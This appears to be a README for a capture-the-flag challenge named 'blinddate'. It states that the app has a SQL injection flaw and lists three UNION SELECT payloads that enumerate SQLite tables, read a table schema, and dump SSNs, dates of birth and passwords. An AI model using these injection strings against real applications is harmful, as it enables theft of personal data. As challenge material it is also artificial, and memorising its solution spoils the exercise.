# blinddate

This app has a blind SQL injection.
The task is to first find the name of the table with the secret data and then extract the SSNs and DOBs.
The flag is one of the SSNs

' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table' --

' UNION SELECT sql, NULL, NULL FROM sqlite_master WHERE name='secret_info' --

' UNION SELECT dob, ssn, password FROM secret_info --
